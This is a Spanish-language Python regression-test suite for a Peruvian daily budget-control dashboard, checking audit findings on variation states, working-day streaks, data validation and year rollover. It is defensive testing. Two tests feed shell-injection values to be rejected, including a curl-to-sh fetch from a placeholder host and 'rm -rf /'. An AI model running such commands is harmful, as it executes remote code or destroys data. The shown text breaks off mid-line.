#!/usr/bin/env python3
"""Pruebas de regresión del control diario de RO (auditoría técnica del 13/11/2026, hallazgos M01–M05 y M08).

Uso:  python herramientas/pruebas_control.py              (sin red; corre en la tarea automática antes de calcular)
      python herramientas/pruebas_control.py --interfaz   (además abre la página en Chromium con Playwright, si está instalado)

Termina con código 1 si alguna prueba falla. Cada prueba lleva el identificador del hallazgo que protege.
"""
import copy
import datetime as dt
import contextlib
import io
import json
import os
import shutil
import sys
import tempfile

AQUI = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, AQUI)
import pandas as pd  # noqa: E402
import tablero_ro as T  # noqa: E402
import verificar_control as V  # noqa: E402
import vigilar_mef as VM  # noqa: E402

# Las pruebas usan la entidad de ejemplo «minsa» con datos sintéticos (herramientas/pruebas). Este portal no la publica,
# así que se agrega solo durante las pruebas, en una carpeta temporal: el pliegos.json real no se toca.
_EJEMPLO = json.load(open(os.path.join(AQUI, "pruebas", "pliegos_prueba.json"), encoding="utf-8"))
_HERR = tempfile.mkdtemp(prefix="herr_pruebas_")
_cfg = json.load(open(os.path.join(AQUI, "pliegos.json"), encoding="utf-8"))
_cfg.update(_EJEMPLO)
json.dump(_cfg, open(os.path.join(_HERR, "pliegos.json"), "w", encoding="utf-8"), ensure_ascii=False)
shutil.copyfile(os.path.join(AQUI, "plantilla_control_ro.html"), os.path.join(_HERR, "plantilla_control_ro.html"))
T.AQUI = _HERR
VM.PLIEGOS.update(_EJEMPLO)

RES = []


def prueba(hallazgo, nombre):
    def deco(f):
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                f()
            RES.append((True, hallazgo, nombre, ""))
        except Exception as e:                                  # noqa: BLE001 — se informa cualquier fallo
            RES.append((False, hallazgo, nombre, f"{type(e).__name__}: {e}"))
        return f
    return deco


def falla_con(exc, f, *a, **k):
    try:
        f(*a, **k)
    except exc as e:
        return e
    raise AssertionError(f"se esperaba {exc.__name__} y no hubo error")


# ------------------------------------------------------------------ M01
@prueba("M01", "−140 y −6 486,75 son «ajuste neto negativo»; 0 es «sin variación»; None es «sin comparación»")
def _():
    c = T.clasificar_variacion
    assert c(-140.0) == "ajuste_negativo" and c(-6486.75) == "ajuste_negativo"
    assert c(0.0) == "sin_variacion" and c(0.99) == "sin_variacion" and c(-0.99) == "sin_variacion"
    assert c(None) == "sin_comparacion" and c(float("nan")) == "sin_comparacion"
    assert c(62328708.93) == "aumento" and c(1.01) == "aumento" and c(-1.01) == "ajuste_negativo"


@prueba("M01", "Estados aplicados a unidades: se publican la variación, ambas fechas y los días hábiles entre cortes")
def _():
    H = pd.DataFrame({"fecha_corte": ["2026-11-06", "2026-11-11"] * 4, "SEC_EJEC": ["A", "A", "B", "B", "C", "C", "D", "D"],
                      "DEVENGADO": [1000, 860, 500, 500, 10, 20, 7, None]})
    U = [{"sec": "A", "dev": 860, "dev_ant": 1000}, {"sec": "B", "dev": 500, "dev_ant": 500},
         {"sec": "C", "dev": 20, "dev_ant": 10}, {"sec": "E", "dev": 5}]
    cmp_ = T.aplicar_actividad(U, H, "2026-11-11")
    assert [u["estado"] for u in U] == ["ajuste_negativo", "sin_variacion", "aumento", "sin_comparacion"], [u["estado"] for u in U]
    assert U[0]["var"] == -140 and U[3]["var"] is None
    assert cmp_ == {"desde": "2026-11-06", "hasta": "2026-11-11", "habiles": 3, "tolerancia": T.TOL_VAR}, cmp_


# ------------------------------------------------------------------ S1 (revisión de seguridad del 19/11/2026)
@prueba("S1", "La fecha de publicación del MEF solo se acepta con su forma estándar; un texto con comandos se rechaza")
def _():
    import vigilar_mef as G
    assert G.fecha_http("Wed, 18 Nov 2026 13:39:08 GMT") == "Wed, 18 Nov 2026 13:39:08 GMT" and G.fecha_http(None) is None
    for malo in ('x"; curl http://ejemplo.invalid | sh; echo "', "$(id)", "`id`", "Wed, 18 Nov 2026 13:39:08 GMT; id", ""):
        falla_con(ValueError, G.fecha_http, malo)
    y = open(os.path.join(os.path.dirname(AQUI), ".github", "workflows", "control-ro.yml"), encoding="utf-8").read()
    assert '"${{ needs.vigilar.outputs' not in y, "una salida de «vigilar» sigue pegada dentro de un guion"


# ------------------------------------------------------------------ M02
F5 = ["2026-11-06", "2026-11-09", "2026-11-10", "2026-11-11", "2026-11-12"]


@prueba("M02", "Caso de la auditoría: acumulado 100 → 90 no produce «9 días sin devengar»")
def _():
    r = T.racha_sin_aumento([100.0, 90.0], ["2026-11-11", "2026-11-12"])
    assert r["n"] == 1 and r["ajustes"] == 1 and r["minimo"] is True, r      # 1 corte (mínimo: no hay historial previo)
    assert "dias" not in json.dumps(r)


@prueba("M02", "Secuencia positiva, cero, negativa y positiva: la racha se reinicia con el aumento")
def _():
    assert T.racha_sin_aumento([10, 20, 20, 15, 30], F5)["n"] == 0
    r = T.racha_sin_aumento([10, 20, 20, 15, 15], F5)
    assert (r["n"], r["desde"], r["minimo"], r["ajustes"]) == (3, "2026-11-09", False, 1), r


@prueba("M02", "Compensación neta (ajuste y operaciones nuevas que suman cero) cuenta como corte sin aumento neto, sin afirmar inactividad")
def _():
    r = T.racha_sin_aumento([10, 50, 50], F5[:3])
    assert r["n"] == 1 and r["desde"] == "2026-11-09" and r["ajustes"] == 0


@prueba("M02", "Primer corte: sin comparación (None); sin aumento desde el inicio: n es un mínimo")
def _():
    assert T.racha_sin_aumento([10], F5[:1]) is None
    r = T.racha_sin_aumento([10, 10, 10], F5[:3])
    assert r["n"] == 2 and r["minimo"] is True and r["desde"] == F5[0]


@prueba("M02", "Cortes faltantes de la unidad: cobertura interrumpida y sin inferir nada antes del hueco")
def _():
    r = T.racha_sin_aumento([10, None, 30, 30], F5[:4])
    assert (r["n"], r["minimo"], r["cobertura"], r["desde"]) == (1, True, "interrumpida", F5[2]), r
    assert T.racha_sin_aumento([10, 20, None, 30], F5[:4]) is None          # el corte anterior falta: no hay comparación
    assert T.racha_sin_aumento([10, 20, None], F5[:3]) is None


@prueba("R3", "Feriados nacionales de todo el año (no solo diciembre) y el mismo calendario que el día por día municipal")
def _():
    d = lambda s: dt.date.fromisoformat(s)
    assert T.dias_habiles(d("2027-01-01"), d("2027-01-01")) == 0                     # Año Nuevo 2027 (viernes)
    assert T.dias_habiles(d("2027-03-22"), d("2027-03-26")) == 3                     # Semana Santa 2027: jueves 25 y viernes 26
    assert T.dias_habiles(d("2027-07-26"), d("2027-07-30")) == 3                     # 28 y 29 de julio de 2027 (miércoles y jueves)
    assert T.dias_habiles(d("2026-11-19"), d("2026-12-31")) == 28                    # 2026 no cambia: solo quedan el 8, 9 y 25 de diciembre
    assert {T._pascua(y) for y in (2025, 2026, 2027)} == {d("2025-04-20"), d("2026-04-05"), d("2027-03-28")}
    nucleo = [os.path.join(os.path.dirname(AQUI), "kronos", "nucleo", "control", "dia.py"),
              os.path.join(os.path.dirname(os.path.dirname(AQUI)), "kronos-nucleo", "nucleo", "control", "dia.py")]
    f = next((x for x in nucleo if os.path.isfile(x)), None)
    if f:                                                                            # en GitHub está el núcleo: los dos calendarios deben coincidir
        src = open(f, encoding="utf-8").read()
        ns = {"dt": dt}
        exec(src[src.index("FIJOS = "):src.index("RUBRO = ")], ns)
        exec(src[src.index("def _pascua"):src.index("def habiles")], ns)
        for y in range(2025, 2031):
            assert ns["feriados"](y) == T.feriados(y), (y, ns["feriados"](y) ^ T.feriados(y))


# Revisión externa del 19/11/2026, punto 3: jueves 12, viernes 13, sábado 14, domingo 15 y lunes 16 de noviembre de 2026
FINDE = ["2026-11-12", "2026-11-13", "2026-11-14", "2026-11-15", "2026-11-16"]


@prueba("R3", "Fin de semana: sábado y domingo sin devengado no cuentan como cortes sin aumento (antes el lunes marcaba 3)")
def _():
    r = T.racha_sin_aumento([10, 20, 20, 20, 20], FINDE)
    assert (r["n"], r["desde"], r["minimo"]) == (1, "2026-11-13", False), r          # solo cuenta el lunes
    r = T.racha_sin_aumento([10, 20, 20, 20], FINDE[:4])                              # visto el domingo: ningún corte hábil sin aumento
    assert (r["n"], r["desde"]) == (0, "2026-11-13"), r
    assert V.racha_esperada([10, 20, 20, 20, 20], FINDE, 1.0) == (1, "2026-11-13", False)   # la verificación independiente coincide


@prueba("R3", "Fin de semana: un aumento registrado el sábado sí reinicia la racha; un ajuste negativo del domingo no suma")
def _():
    r = T.racha_sin_aumento([10, 20, 30, 30, 30], FINDE)
    assert (r["n"], r["desde"]) == (1, "2026-11-14"), r
    r = T.racha_sin_aumento([10, 20, 20, 15, 15], FINDE)
    assert (r["n"], r["ajustes"]) == (1, 0), r


@prueba("R3", "Feriados del 8 y 9 de diciembre: tampoco cuentan como cortes sin aumento")
def _():
    r = T.racha_sin_aumento([10, 20, 20, 20, 20], ["2026-12-04", "2026-12-07", "2026-12-08", "2026-12-09", "2026-12-10"])
    assert (r["n"], r["desde"]) == (1, "2026-12-07"), r


@prueba("R3", "Página: un periodo sin días hábiles no se rotula «1 día hábil» ni se compara con lo necesario por día")
def _():
    s = open(os.path.join(AQUI, "plantilla_control_ro.html"), encoding="utf-8").read()
    assert "x.d===0?'sin días hábiles (fin de semana o feriado)" in s and "const FINDE=" in s
    assert "&&!FINDE())" in s                                                         # sin variación en fin de semana: sin borde de alerta
    assert "Cifras al ${F(D.corte)}" in s and "Total de lo filtrado" in s             # puntos 2 y 5: fecha a la vista y total del filtro


@prueba("M02", "El método anterior («días sin devengar» desde el inicio del mes) ya no existe en el generador ni en la página")
def _():
    src = open(os.path.join(AQUI, "tablero_ro.py"), encoding="utf-8").read()
    assert "def sin_devengar" not in src and 'return par["habiles_desde_base"], "base"' not in src
    html = open(os.path.join(AQUI, "plantilla_control_ro.html"), encoding="utf-8").read()
    for viejo in ("dias_sin", "Días hábiles sin devengar", "Sin devengado en el último día", "Último día", "u.ult"):
        assert viejo not in html, viejo


# ------------------------------------------------------------------ M03
CAB = ["ANO_EJE", "MES_EJE", "NIVEL_GOBIERNO", "SECTOR", "PLIEGO", "SEC_EJEC", "EJECUTORA_NOMBRE", "SEC_FUNC", "TIPO_ACT_PROY",
       "PRODUCTO_PROYECTO", "PRODUCTO_PROYECTO_NOMBRE", "META", "FUENTE_FINANCIAMIENTO", "RUBRO", "GENERICA"] + [f"MONTO_{m}" for m in T.MONTOS]
CFG = {"pliego": "011", "nivel": "E", "sector": "11", "anio": 2026}


def linea(valores, cab=CAB, sep=","):
    return sep.join('"' + str(valores.get(c, "")).replace('"', '""') + '"' for c in cab).encode()


def fila(pim="100", dev="40", **kw):
    v = {"ANO_EJE": "2026", "MES_EJE": "11", "NIVEL_GOBIERNO": "E", "SECTOR": "11", "PLIEGO": "011", "SEC_EJEC": "117",
         "EJECUTORA_NOMBRE": "ADMINISTRACION CENTRAL", "SEC_FUNC": "1", "TIPO_ACT_PROY": "3", "PRODUCTO_PROYECTO": "3999999",
         "PRODUCTO_PROYECTO_NOMBRE": "SIN PRODUCTO", "META": "1", "FUENTE_FINANCIAMIENTO": "1", "RUBRO": "00", "GENERICA": "3",
         "MONTO_PIM": pim, "MONTO_DEVENGADO": dev}
    v.update(kw)
    return v


def leer(*filas, cab=CAB, sep=","):
    return T.leer_filas([sep.join(f'"{c}"' for c in cab).encode()] + [linea(f, cab, sep) for f in filas], CFG)


@prueba("M03", "Un importe «NO_NUMERICO» rechaza el lote (antes se sumaba como 0)")
def _():
    e = falla_con(T.DatosInvalidos, leer, fila(dev="NO_NUMERICO"))
    assert "MONTO_DEVENGADO" in str(e)


@prueba("M03", "NaN, infinito, mes no numérico, fila truncada y archivo vacío se rechazan")
def _():
    for f in (fila(dev="nan"), fila(pim="inf"), fila(MES_EJE="XI")):
        falla_con(T.DatosInvalidos, leer, f)
    trunc = [",".join(f'"{c}"' for c in CAB).encode(), linea(fila())[:-40]]
    falla_con(T.DatosInvalidos, T.leer_filas, trunc, CFG)
    falla_con(T.DatosInvalidos, T.leer_filas, [], CFG)


@prueba("M03", "Encabezado reordenado: se lee por nombre de columna y da los mismos totales")
def _():
    df1, _ = leer(fila(pim="100", dev="40"))
    df2, _ = leer(fila(pim="100", dev="40"), cab=list(reversed(CAB)))
    assert df1.PIM.sum() == df2.PIM.sum() == 100 and df1.DEVENGADO.sum() == df2.DEVENGADO.sum() == 40


@prueba("M03", "Columna ausente, columnas repetidas o separador inesperado detienen la lectura")
def _():
    e = falla_con(T.DatosInvalidos, leer, fila(), cab=[c for c in CAB if c != "MONTO_DEVENGADO"])
    assert "MONTO_DEVENGADO" in str(e)
    falla_con(T.DatosInvalidos, leer, fila(), cab=CAB + ["META"])
    falla_con(T.DatosInvalidos, leer, fila(), sep=";")


@prueba("M03", "Nombres con comas y comillas, importes vacíos (=0) y negativos válidos se leen bien")
def _():
    df, nom = leer(fila(pim="200", dev="30"), fila(pim="", dev="-25.5", EJECUTORA_NOMBRE='HOSPITAL "A", LIMA'))
    assert df.PIM.sum() == 200 and df.DEVENGADO.sum() == 4.5 and nom["117"] == 'HOSPITAL "A", LIMA'


@prueba("M03", "Sin filas RO del pliego: se rechaza (no se publica un control vacío)")
def _():
    falla_con(T.DatosInvalidos, leer, fila(FUENTE_FINANCIAMIENTO="2"))


@prueba("M03", "El JSON del núcleo con un importe no numérico también se rechaza")
def _():
    df = pd.DataFrame({m: [1.0, 2.0] for m in T.MONTOS}).astype(object)
    df.loc[1, "DEVENGADO"] = "x"
    falla_con(T.DatosInvalidos, T.validar_montos, df.copy(), "prueba.json")
    df.loc[1, "DEVENGADO"] = float("inf")
    falla_con(T.DatosInvalidos, T.validar_montos, df, "prueba.json")


# ------------------------------------------------------------------ M05
@prueba("M05", "Anterior = mayor fecha estrictamente menor (nunca el propio candidato ni una posterior)")
def _():
    f = ["2026-11-10", "2026-11-11", "2026-11-12"]
    assert T.anterior_a(f, "2026-11-11") == "2026-11-10" and T.anterior_a(f, "2026-11-13") == "2026-11-12"
    assert T.anterior_a(f, "2026-11-10") is None


@prueba("M05", "Barrera: candidato anterior al publicado se rechaza; igual (revisión) se permite")
def _():
    falla_con(T.CorteRetrocede, T.verificar_cronologia, "2026-11-11", "2026-11-12", ["2026-11-10", "2026-11-12"])
    falla_con(T.CorteRetrocede, T.verificar_cronologia, "2026-11-11", None, ["2026-11-12"])
    assert T.verificar_cronologia("2026-11-12", "2026-11-12", ["2026-11-10", "2026-11-12"]) == "2026-11-12"


def json_sintetico(ruta, publicado, dev_117=500.0, meses=range(1, 12)):
    claves = ["MES_EJE", "SEC_EJEC", "SEC_FUNC", "TIPO_ACT_PROY", "PRODUCTO_PROYECTO", "META", "RUBRO", "GENERICA", "FUENTE"]
    filas = []
    meses = list(meses)
    for mes in meses:
        filas.append([mes, "117", "1", "3", "3999999", "1", "00", "3", "1", 0, 0, 0, 0, 0, 40.0 if mes < 11 else dev_117 - 400, 0])
        filas.append([mes, "1345", "2", "3", "3999999", "2", "00", "3", "1", 0, 0, 0, 0, 0, 10.0, 0])
    filas += [[0, "117", "1", "3", "3999999", "1", "00", "3", "1", 1000, 1000, 900, 800, 700, 0, 0],
              [0, "1345", "2", "3", "3999999", "2", "00", "3", "1", 300, 300, 250, 200, 150, 0, 0]]
    J = {"claves": claves, "montos": T.MONTOS, "filas": filas, "nombres": {"ue": {"117": "ADMINISTRACION CENTRAL", "1345": "CENARES"}, "prod": {}},
         "meta": {"publicado": publicado}}
    json.dump(J, open(ruta, "w", encoding="utf-8"))


def correr_main(raiz, args, anio=None):
    """Corre el generador completo sobre una carpeta temporal (sin red). anio: ejercicio distinto al de pliegos.json."""
    viejo = (T.RAIZ, T.AQUI, T.perfil_de, sys.argv)
    aqui = T.AQUI
    if anio:
        aqui = os.path.join(raiz, "_herr")
        os.makedirs(aqui, exist_ok=True)
        cfg = json.load(open(os.path.join(_HERR, "pliegos.json"), encoding="utf-8"))
        cfg["minsa"]["anio"] = anio
        json.dump(cfg, open(os.path.join(aqui, "pliegos.json"), "w", encoding="utf-8"))
        shutil.copyfile(os.path.join(AQUI, "plantilla_control_ro.html"), os.path.join(aqui, "plantilla_control_ro.html"))
    T.RAIZ, T.AQUI, T.perfil_de, sys.argv = raiz, aqui, (lambda eid: os.path.join(raiz, "sin_perfil.json")), ["tablero_ro.py", "minsa"] + args
    T.FUENTES.clear()
    try:
        T.main()
        return 0
    except SystemExit as e:
        return e.code
    finally:
        T.RAIZ, T.AQUI, T.perfil_de, sys.argv = viejo


@prueba("M05", "Aceptación obligatoria: 10 → 12 → fallo de fuente → candidato 11: el portal sigue en 12, sin variación artificial, con el motivo registrado")
def _():
    tmp = tempfile.mkdtemp()
    try:
        out = os.path.join(tmp, "minsa", "ro")
        os.makedirs(out)
        js = os.path.join(tmp, "g.json")
        for publicado, dev in (("Wed, 11 Nov 2026 14:00:00 GMT", 480.0), ("Fri, 13 Nov 2026 14:00:00 GMT", 520.0)):   # cortes 10/11 y 12/11
            json_sintetico(js, publicado, dev)
            assert correr_main(tmp, ["--json", js, "--sin-ca"]) == 0
        antes = {f: open(os.path.join(out, f), "rb").read() for f in ("datos.json", "historial.csv", "historial_proyectos.csv", "proyectos.json")}
        D = json.loads(antes["datos.json"])
        assert D["corte"] == "2026-11-12" and D["corte_anterior"] == "2026-11-10"
        json_sintetico(js, "Thu, 12 Nov 2026 14:00:00 GMT", 500.0)                       # la fuente alternativa trae el 11/11
        assert correr_main(tmp, ["--json", js, "--sin-ca"]) == 3
        for f, b in antes.items():
            assert open(os.path.join(out, f), "rb").read() == b, f"{f} cambió"
        E = json.load(open(os.path.join(out, "estado.json"), encoding="utf-8"))
        assert E["resultado"] == "corte_retenido" and E["corte_candidato"] == "2026-11-11" and "12/11/2026" in E["detalle"], E
        # y el corte publicado sigue pasando la verificación completa
        assert all(r[0] for r in V.verificar(D, json.loads(antes["proyectos.json"]))), [r for r in V.verificar(D) if not r[0]]
    finally:
        shutil.rmtree(tmp)


@prueba("M04", "Cada corrida publica su resultado real: nuevo corte, consulta sin cambios")
def _():
    tmp = tempfile.mkdtemp()
    try:
        out = os.path.join(tmp, "minsa", "ro")
        os.makedirs(out)
        js = os.path.join(tmp, "g.json")
        json_sintetico(js, "Fri, 13 Nov 2026 14:00:00 GMT")
        assert correr_main(tmp, ["--json", js, "--sin-ca"]) == 0
        assert json.load(open(os.path.join(out, "estado.json"), encoding="utf-8"))["resultado"] == "nuevo_corte"
        assert correr_main(tmp, ["--json", js, "--sin-ca"]) == 0
        E = json.load(open(os.path.join(out, "estado.json"), encoding="utf-8"))
        assert E["resultado"] == "sin_cambios" and E["ultimo_exito"] and "Datos Abiertos" in E["fuentes"], E
    finally:
        shutil.rmtree(tmp)



# ------------------------------------------------------------------ N01: cambio de año
D_ = __import__("datetime").date


@prueba("N01", "Calendario: meses completos solo dentro del ejercicio, mes base válido y cierre después del 31/12")
def _():
    k = T.calendario_corte
    assert k(D_(2026, 11, 13), 2026)["completos"] == [8, 9, 10] and k(D_(2026, 11, 13), 2026)["mes_base"] == 10
    a = k(D_(2026, 12, 31), 2026)
    assert a["completos"] == [10, 11, 12] and a["meses_rest"] == 0 and not a["cierre"]
    b = k(D_(2027, 1, 4), 2026)                                   # el MEF sigue publicando el archivo 2026 en enero
    assert b["cierre"] and b["c"] == D_(2026, 12, 31) and b["meses_rest"] == 0
    e = k(D_(2027, 1, 5), 2027)                                   # ejercicio nuevo, primer corte de enero
    assert e["parcial"] and e["completos"] == [] and e["mes_base"] == 0 and e["fin_base"] == D_(2026, 12, 31)
    assert k(D_(2027, 1, 31), 2027)["completos"] == [1]
    f = k(D_(2027, 2, 1), 2027)
    assert f["completos"] == [1] and f["mes_base"] == 1 and min(f["completos"]) >= 1
    assert all(min(k(D_(2027, m, 15), 2027)["completos"] or [1]) >= 1 for m in range(1, 13))
    falla_con(T.DatosInvalidos, k, D_(2025, 12, 30), 2026)


@prueba("N01", "Cierre: un corte de enero del archivo 2026 no rompe el control; saldo final = saldo proyectado y verificación completa")
def _():
    tmp = tempfile.mkdtemp()
    try:
        js = os.path.join(tmp, "g.json")
        json_sintetico(js, "Tue, 05 Jan 2027 14:00:00 GMT", 520.0, range(1, 13))
        assert correr_main(tmp, ["--json", js, "--sin-ca"]) == 0
        D = json.load(open(os.path.join(tmp, "minsa", "ro", "datos.json"), encoding="utf-8"))
        assert D["corte"] == "2027-01-04" and D["parametros"]["cierre"] is True and D["semana"]["dias_habiles"] == 0
        assert D["semana"]["dias_cal"] == 0 and abs(D["total"]["riesgo"] - D["total"]["saldo"]) < 1
        malas = [r for r in V.verificar(D, json.load(open(os.path.join(tmp, "minsa", "ro", "proyectos.json"), encoding="utf-8"))) if not r[0]]
        assert not malas, malas
    finally:
        shutil.rmtree(tmp)


@prueba("N01", "Ejercicio nuevo: primer corte de enero 2027 calcula con ritmo provisional del mes en curso y pasa la verificación")
def _():
    tmp = tempfile.mkdtemp()
    try:
        js = os.path.join(tmp, "g.json")
        json_sintetico(js, "Wed, 06 Jan 2027 14:00:00 GMT", 450.0, [1])
        assert correr_main(tmp, ["--json", js, "--sin-ca"], anio=2027) == 0
        D = json.load(open(os.path.join(tmp, "minsa", "ro", "datos.json"), encoding="utf-8"))
        p = D["parametros"]
        assert D["corte"] == "2027-01-05" and p["ritmo_parcial"] == [1, 5] and p["fecha_base"] == "2026-12-31"
        assert "provisional" in p["meses_ritmo_txt"] and D["semana"]["dias_habiles"] > 200
        malas = [r for r in V.verificar(D, json.load(open(os.path.join(tmp, "minsa", "ro", "proyectos.json"), encoding="utf-8"))) if not r[0]]
        assert not malas, malas
    finally:
        shutil.rmtree(tmp)

# ------------------------------------------------------------------ M04
@prueba("M04", "Vigilancia: una fuente ilegible no cuenta como novedad ni como «sin novedades» verificadas")
def _():
    v = {"ca_fecha": "2026-11-12", "da_publicado": "Fri, 13 Nov 2026 21:17:06 GMT"}
    assert VM.decidir(v, None, None, 2) == (False, "sin novedades del MEF")      # decide no descargar…
    salida = io.StringIO()
    viejo = (VM.fecha_consulta_amigable, VM.publicado_datos_abiertos, sys.argv, VM.horas_desde_ultima)

    def boom():
        raise OSError("HTTP 503")
    VM.fecha_consulta_amigable, VM.publicado_datos_abiertos, VM.horas_desde_ultima = boom, boom, (lambda eid: 2)
    sys.argv = ["vigilar_mef.py", "minsa"]
    os.environ.pop("GITHUB_OUTPUT", None)
    try:
        with contextlib.redirect_stdout(salida):
            code = 0
            try:
                VM.main()
            except SystemExit as e:
                code = e.code
        assert code == 1, "…pero la tarea debe terminar con error para que la página diga «No se pudo verificar»"
        assert "No se pudo verificar" in salida.getvalue()
    finally:
        VM.fecha_consulta_amigable, VM.publicado_datos_abiertos, sys.argv, VM.horas_desde_ultima = viejo


@prueba("M04/M09", "Una entidad desconocida (o con caracteres de shell) se rechaza como dato")
def _():
    viejo = sys.argv
    sys.argv = ["vigilar_mef.py", "minsa; rm -rf /"]
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            try:
                VM.main()
                raise AssertionError("no se rechazó")
            except SystemExit as e:
                assert e.code == 1
    finally:
        sys.argv = viejo


@prueba("M04", "La página no deduce el estado del reloj: sin «Revisando», «Datos nuevos» ni «El MEF todavía no publica»")
def _():
    html = open(os.path.join(AQUI, "plantilla_control_ro.html"), encoding="utf-8").read()
    for viejo in ("Revisando", "Datos nuevos", "El MEF todavía no publica", "Próxima revisión del MEF", "j.actualizado!==base"):
        assert viejo not in html, viejo
    for nuevo in ("Próxima consulta prevista", "No se pudo verificar si hay datos más recientes", "estado.json", "actions/workflows/control-ro.yml/runs",
                  "Último corte disponible", "Nuevo corte", "Cifras revisadas"):
        assert nuevo in html, nuevo


# ------------------------------------------------------------------ M08: cada regla de la verificación falla ante su error
def datos_base():
    """Copia fija del corte MINSA del 12/11/2026 (incluye un «sin variación» y dos ajustes netos negativos). No depende de los
    datos vivos: así las pruebas no dejan de correr ni bloquean la publicación cuando un corte nuevo no trae esos casos."""
    d = os.path.join(AQUI, "pruebas")
    return (json.load(open(os.path.join(d, "datos_ejemplo.json"), encoding="utf-8")),
            json.load(open(os.path.join(d, "proyectos_ejemplo.json"), encoding="utf-8")))


def u_de(D, estado):
    return next(u for u in D["ues"] if u["estado"] == estado)


MUTACIONES = [
    ("ajuste negativo mostrado como «sin variación»", lambda D, P: u_de(D, "ajuste_negativo").update(estado="sin_variacion"), "Estado coherente"),
    ("cero mostrado como ajuste", lambda D, P: u_de(D, "sin_variacion").update(estado="ajuste_negativo"), "Estado coherente"),
    ("racha inventada (9 cortes)", lambda D, P: u_de(D, "ajuste_negativo")["sin_aumento"].update(n=9), "Racha de cortes"),
    ("racha presentada como exacta cuando es un mínimo", lambda D, P: D["ues"][0].update(sin_aumento=dict(D["ues"][0]["sin_aumento"], n=2, minimo=False)), "Racha de cortes"),
    ("variación que no es la diferencia de acumulados", lambda D, P: D["ues"][0].update(var=D["ues"][0]["var"] + 50), "Variación entre cortes = devengado"),
    ("importe no finito", lambda D, P: D["ues"][0].update(pim=float("nan")), "números finitos"),
    ("unidad duplicada", lambda D, P: D["ues"].append(copy.deepcopy(D["ues"][0])), "una sola vez"),
    ("corte anterior igual al candidato", lambda D, P: D.update(corte_anterior=D["corte"]), "mayor estrictamente menor"),
    ("corte publicado que no es el más reciente", lambda D, P: D.update(corte=D["fechas"][-2]), "más reciente del historial"),
    ("saldo mal calculado", lambda D, P: D["ues"][0].update(saldo=D["ues"][0]["saldo"] + 10), "Saldo = PIM"),
    ("proyecto de una unidad inexistente", lambda D, P: P["ues"].update({"9999": P["ues"][D["ues"][0]["sec"]]}), "todo proyecto pertenece"),
    ("proyectos que no suman el devengado de su unidad", lambda D, P: P["ues"][D["ues"][0]["sec"]][0].update(dev=P["ues"][D["ues"][0]["sec"]][0]["dev"] + 1e6), "suman el PIM y el devengado"),
    ("bloque de comparación sin fechas", lambda D, P: D.update(comparacion={}), "declara las fechas"),
]


@prueba("M08", "Los datos publicados pasan todas las verificaciones")
def _():
    D, P = datos_base()
    malas = [r for r in V.verificar(D, P) if not r[0]]
    assert not malas, malas


for _nombre, _mut, _regla in MUTACIONES:
    def _hacer(nombre=_nombre, mut=_mut, regla=_regla):
        @prueba("M08", f"Error sembrado «{nombre}» → falla la regla «{regla}»")
        def _():
            D, P = datos_base()
            mut(D, P)
            malas = [r[1] for r in V.verificar(D, P) if not r[0]]
            assert any(regla in m for m in malas), f"no falló ninguna regla con «{regla}»; fallaron: {malas}"
    _hacer()


@prueba("M08", "No quedan reglas que se aprueben de forma incondicional")
def _():
    src = open(os.path.join(AQUI, "verificar_control.py"), encoding="utf-8").read()
    assert ", True," not in src and "ok(\"Unidades sin referencia" not in src


# ------------------------------------------------------------------ interfaz (opcional)
def interfaz():
    """Abre la página con datos sintéticos (−140, −6 486,75, 0 y sin comparación) en 320/360/390/412 px y en escritorio."""
    from playwright.sync_api import sync_playwright
    import http.server
    import threading
    raiz = os.path.dirname(AQUI)
    tmp = tempfile.mkdtemp()
    shutil.copytree(os.path.join(raiz, "minsa", "ro"), os.path.join(tmp, "ro"))
    D = datos_base()[0]
    D["ues"][0].update(estado="sin_comparacion", var=None, sin_aumento=None)
    D["ues"][0].pop("dev_ant", None)
    json.dump(D, open(os.path.join(tmp, "ro", "datos.json"), "w", encoding="utf-8"))
    shutil.copyfile(os.path.join(AQUI, "plantilla_control_ro.html"), os.path.join(tmp, "ro", "index.html"))
    class Silencioso(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *a):
            pass
    h = http.server.ThreadingHTTPServer(("127.0.0.1", 0), lambda *a: Silencioso(*a, directory=tmp))
    threading.Thread(target=h.serve_forever, daemon=True).start()
    url = f"http://127.0.0.1:{h.server_port}/ro/"
    exe = next((p for p in ("/usr/bin/google-chrome", "/usr/bin/chromium") if os.path.exists(p)), None)
    try:
        with sync_playwright() as p:
            b = p.chromium.launch(executable_path=exe, args=["--no-sandbox"]) if exe else p.chromium.launch()
            for w in (320, 360, 390, 412, 1280):
                mov = w < 800
                pg = b.new_page(viewport={"width": w, "height": 800}, is_mobile=mov, has_touch=mov)
                pg.route("**/fonts.googleapis.com/**", lambda r: r.abort())
                pg.route("**/api.github.com/**", lambda r: r.fulfill(status=200, content_type="application/json",
                                                                       body='{"workflow_runs":[{"status":"completed","conclusion":"failure","run_started_at":"2026-11-14T05:23:00Z"}]}'))
                pg.goto(url)
                pg.wait_for_selector("#chips button")

                @prueba("M01/M06", f"{w}px: chips, alerta y estados con los casos de la auditoría")
                def _():
                    chips = pg.locator("#chips button").all_inner_texts()
                    assert "Ajuste neto negativo (2)" in chips and "Sin variación entre cortes (1)" in chips, chips
                    assert "−S/ 140" in pg.locator("#alerta").inner_text() and "−S/ 6,487" in pg.locator("#alerta").inner_text()
                    pg.click("#chips button[data-k=aj]")
                    sel = "#tarjetas .tj" if mov else "#cuerpo tr[data-s]"
                    txt = " ".join(pg.locator(sel).all_inner_texts())
                    assert pg.locator(sel).count() == 2 and txt.count("Ajuste neto negativo") == 2 and "Sin variación" not in txt, txt
                    pg.click("#chips button[data-k=todas]")
                    assert "Sin comparación" in " ".join(pg.locator(sel).all_inner_texts())

                @prueba("M04", f"{w}px: una consulta fallida se informa como «No se pudo verificar…»")
                def _():
                    assert "No se pudo verificar si hay datos más recientes" in pg.locator("#vigencia").inner_text()
                    assert "no terminó bien" in pg.locator("#op").inner_text()

                @prueba("M06", f"{w}px: sin desbordamiento global; en celular, lista del gráfico y tarjetas legibles (≥12 px)")
                def _():
                    m = pg.evaluate("""()=>({d:document.documentElement.scrollWidth>innerWidth+1,
                        lst:getComputedStyle(document.querySelector('.dia .dlist')).display, svg:getComputedStyle(document.querySelector('.dia .svgw')).display,
                        tj:getComputedStyle(document.querySelector('#tarjetas')).display,
